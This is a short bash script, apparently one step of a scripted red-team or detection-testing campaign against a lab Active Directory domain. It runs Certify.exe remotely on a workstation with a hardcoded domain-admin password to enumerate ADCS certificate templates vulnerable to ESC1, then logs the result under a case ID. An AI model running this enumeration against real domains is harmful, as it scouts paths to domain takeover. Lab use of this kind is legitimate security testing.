#!/usr/bin/env bash
# T050 — ADCS ESC1 enumeration from ws01 as chief_command (cadre.local DA)
# Entry credential: chief_command (earned via Branch A T015 ForceChangePassword)
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LIB="${SCRIPT_DIR}/../lib"
source "${LIB}/campaign-a-common.sh"

CASE_ID="CADRE-T050-ESC1-${CASE_DATE:-$(date -u +%Y%m%d)}"
T0=$(date -u +%Y-%m-%dT%H:%M:%SZ)

echo "=== T050 ESC1 | ${CASE_ID} | T0=${T0} ==="

DC01="${DC01:-dc01.cadre.local}"

CMD='
$c = "C:\Tools\cadre-attack\Certify.exe";
if (-not (Test-Path $c)) { throw "Certify.exe not found" }
& $c find /vulnerable /domain:"cadre.local" /dc:"'''"${DC01}"'''";
Write-Output "T050_OK: ESC1 enumeration complete"
'

ws01_exec_as chief_command 'C0mm@nd_Ch1ef!' "$CMD" 'cadre.local'

cadre_export "${CASE_ID}" T050 "${T0}" 192.168.77.62
echo "T0=${T0}" | tee "/tmp/${CASE_ID}.t0"
echo "=== T050 run complete ==="
